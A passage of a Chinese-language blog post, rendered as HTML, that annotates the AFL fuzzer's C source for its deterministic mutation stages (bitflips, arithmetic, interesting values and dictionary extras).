class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Walking byte. */</span></span><br><span class="line"></span><br><span class="line">stage_name = <span class="string">&quot;bitflip 8/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip8&quot;</span>;</span><br><span class="line">stage_max = len;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = stage_cur;</span><br><span class="line"></span><br><span class="line">  out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line">  <span class="comment">// 每次翻转一个byte</span></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))</span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  <span class="comment">// 运行测试</span></span><br><span class="line">  <span class="comment">/* We also use this stage to pull off a simple trick: we identify</span></span><br><span class="line"><span class="comment">     bytes that seem to have no effect on the current execution path</span></span><br><span class="line"><span class="comment">     even when fully flipped - and we skip them during more expensive</span></span><br><span class="line"><span class="comment">     deterministic stages, such as arithmetics or known ints. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[EFF_APOS(stage_cur)])</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If in dumb mode or if the file is very short, just flag everything</span></span><br><span class="line"><span class="comment">       without wasting time on checksums. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)</span><br><span class="line">      cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      cksum = ~queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">// 用来区分一些无效byte，为后面的阶段做准备</span></span><br><span class="line">      eff_map[EFF_APOS(stage_cur)] = <span class="number">1</span>;</span><br><span class="line">      eff_cnt++;</span><br><span class="line">      <span class="comment">// 通过一个eff_map 来标记有效byte</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line">  <span class="comment">// 还原byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the effector map is more than EFF_MAX_PERC dense, just flag the</span></span><br><span class="line"><span class="comment">   whole thing as worth fuzzing, since we wouldn&#x27;t be saving much time</span></span><br><span class="line"><span class="comment">   anyway. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (eff_cnt != EFF_ALEN(len) &amp;&amp;</span><br><span class="line">    eff_cnt * <span class="number">100</span> / EFF_ALEN(len) &gt; EFF_MAX_PERC)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果eff_map 大于 EFF_MAX_PERC </span></span><br><span class="line">  <span class="comment">// 那么直接把整个testcase标记为值得fuzz的，这不会多浪费多少时间</span></span><br><span class="line">  <span class="built_in">memset</span>(eff_map, <span class="number">1</span>, EFF_ALEN(len));</span><br><span class="line"></span><br><span class="line">  blocks_eff_select += EFF_ALEN(len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  blocks_eff_select += eff_cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blocks_eff_total += EFF_ALEN(len);</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP8] += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP8] += stage_max;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来是 <strong>bitflip 16/8</strong></p><p>处理类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">goto</span> skip_bitflip;</span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 16/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip16&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)]) &#123;</span><br><span class="line">    stage_max--;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  *(u16*)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  stage_cur++;</span><br><span class="line"></span><br><span class="line">  *(u16*)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP16]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP16] += stage_max;</span><br></pre></td></tr></table></figure><p>然后是 <strong>bitflip 32/8</strong>，逻辑相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">4</span>) <span class="keyword">goto</span> skip_bitflip;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Four walking bytes. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 32/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip32&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len - <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">1</span>)] &amp;&amp;</span><br><span class="line">      !eff_map[EFF_APOS(i + <span class="number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="number">3</span>)]) &#123;</span><br><span class="line">    stage_max--;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  *(u32*)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  stage_cur++;</span><br><span class="line"></span><br><span class="line">  *(u32*)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP32]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP32] += stage_max;</span><br></pre></td></tr></table></figure><p>以上，第一个bitflip阶段就完成了</p><h4 id="ARITHMETIC-INC-DEC">ARITHMETIC INC/DEC</h4><p>这个阶段是算数加减阶段</p><p>首先是 <strong>arith 8/8</strong> ， 对一个byte大小的数据进行加减</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> stage_name  = <span class="string">&quot;arith 8/8&quot;</span>;</span><br><span class="line"> stage_short = <span class="string">&quot;arith8&quot;</span>;</span><br><span class="line"> stage_cur   = <span class="number">0</span>;</span><br><span class="line"> stage_max   = <span class="number">2</span> * len * ARITH_MAX;</span><br><span class="line"></span><br><span class="line"> stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line"> orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">   u8 orig = out_buf[i];</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;</span><br><span class="line">     stage_max -= <span class="number">2</span> * ARITH_MAX;</span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">     <span class="comment">// 如果不是有效位置，那么就避免进行变异</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line">   <span class="comment">// 这里的 ARITH_MAX 是35</span></span><br><span class="line">     u8 r = orig ^ (orig + j);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Do arithmetic operations only if the result couldn&#x27;t be a product</span></span><br><span class="line"><span class="comment">        of a bitflip. */</span></span><br><span class="line">     <span class="comment">// 并且要确保进行算术运算后的值不可以经过bitflip得到，避免重复变异</span></span><br><span class="line">     <span class="keyword">if</span> (!could_be_bitflip(r)) &#123;</span><br><span class="line"></span><br><span class="line">       stage_cur_val = j;</span><br><span class="line">       out_buf[i] = orig + j;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">       stage_cur++;</span><br><span class="line"></span><br><span class="line">     &#125; <span class="keyword">else</span> stage_max--;</span><br><span class="line"></span><br><span class="line">     r =  orig ^ (orig - j);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!could_be_bitflip(r)) &#123;</span><br><span class="line"></span><br><span class="line">       stage_cur_val = -j;</span><br><span class="line">       out_buf[i] = orig - j;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">       stage_cur++;</span><br><span class="line"></span><br><span class="line">     &#125; <span class="keyword">else</span> stage_max--;</span><br><span class="line"></span><br><span class="line">     out_buf[i] = orig;</span><br><span class="line"><span class="comment">// 加减法都尝试一次</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line"> stage_finds[STAGE_ARITH8]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line"> stage_cycles[STAGE_ARITH8] += stage_max;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后还有</p><ul><li>arith 16/8</li><li>arith 32/8<br>分别进行16位和32位的加减， 这里不过多赘述</li></ul><h4 id="INTERESTING-VALUES">INTERESTING VALUES</h4><p>这一步主要是使用一些有意义的值来替换</p><p>首先是 <strong>interest 8/8</strong></p><p>用interest值替换一个8位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">stage_name  = <span class="string">&quot;interest 8/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;int8&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len * <span class="keyword">sizeof</span>(interesting_8);</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Setting 8-bit integers. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  u8 orig = out_buf[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;</span><br><span class="line">    stage_max -= <span class="keyword">sizeof</span>(interesting_8);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="keyword">sizeof</span>(interesting_8); j++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Skip if the value could be a product of bitflips or arithmetics. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (could_be_bitflip(orig ^ (u8)interesting_8[j]) ||</span><br><span class="line">        could_be_arith(orig, (u8)interesting_8[j], <span class="number">1</span>)) &#123;</span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_val = interesting_8[j];</span><br><span class="line">    out_buf[i] = interesting_8[j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    out_buf[i] = orig;</span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，还有:</p><ul><li>interest 16/8</li><li>interest 32/8</li></ul><h4 id="DICTIONARY-STUFF">DICTIONARY STUFF</h4><p>这一阶段是使用字典或者之前得到的有意义的extras替换种子的内容</p><p>首先是替换为extras</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/********************</span></span><br><span class="line"><span class="comment"> * DICTIONARY STUFF *</span></span><br><span class="line"><span class="comment"> ********************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extras_cnt) <span class="keyword">goto</span> skip_user_extras;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Overwrite with user-supplied extras. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;user extras (over)&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;ext_UO&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = extras_cnt * len;</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  u32 last_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Extras are sorted by size, from smallest to largest. This means</span></span><br><span class="line"><span class="comment">     that we don&#x27;t have to worry about restoring the buffer in</span></span><br><span class="line"><span class="comment">     between writes at a particular offset determined by the outer</span></span><br><span class="line"><span class="comment">     loop. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also</span></span><br><span class="line"><span class="comment">       skip them if there&#x27;s no room to insert the payload, if the token</span></span><br><span class="line"><span class="comment">       is redundant, or if its entire span has no bytes set in the effector</span></span><br><span class="line"><span class="comment">       map. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;= MAX_DET_EXTRAS) ||</span><br><span class="line">        extras[j].len &gt; len - i ||</span><br><span class="line">        !<span class="built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||</span><br><span class="line">        !<span class="built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="number">1</span>, EFF_SPAN_ALEN(i, extras[j].len))) &#123;</span><br><span class="line"></span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    last_len = extras[j].len;</span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf + i, extras[j].data, last_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Restore all the clobbered memory. */</span></span><br><span class="line">  <span class="built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_EXTRAS_UO]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_EXTRAS_UO] += stage_max;</span><br></pre></td></tr></table></figure><p>或者插入extras</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_EXTRAS_UO]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_EXTRAS_UO] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insertion of user-supplied extras. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;user extras (insert)&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;ext_UI&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = extras_cnt * (len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">ex_tmp = ck_alloc(len + MAX_DICT_FILE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; extras_cnt; j++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len + extras[j].len &gt; MAX_FILE) &#123;</span><br><span class="line">      stage_max--; </span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Insert token */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i, extras[j].data, extras[j].len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy tail */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ex_tmp + i + extras[j].len, out_buf + i, len - i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common_fuzz_stuff(argv, ex_tmp, len + extras[j].len)) &#123;</span><br><span class="line">      ck_free(ex_tmp);</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Copy head */</span></span><br><span class="line">  ex_tmp[i] = out_buf[i];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ck_free(ex_tmp);</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_EXTRAS_UI]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_EXTRAS_UI] += stage_max;</span><br></pre></td></tr></table></figure><p>最后尝试之前变异阶段得到的extras:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!a_extras_cnt) <span class="keyword">goto</span> skip_extras;</span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;auto extras (over)&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;ext_AO&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = MIN(a_extras_cnt, USE_AUTO_EXTRAS) * len;</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_NONE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  u32 last_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span 